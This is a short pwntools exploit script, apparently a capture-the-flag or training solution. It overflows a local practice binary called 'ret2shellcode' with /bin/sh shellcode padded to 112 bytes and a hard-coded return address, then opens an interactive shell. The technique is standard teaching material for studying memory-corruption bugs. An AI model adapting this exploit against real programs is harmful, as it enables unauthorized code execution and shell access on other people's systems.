from pwn import *

p = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

p.sendline(shellcode.ljust(112, b'A') + p32(buf2_addr))
p.interactive()
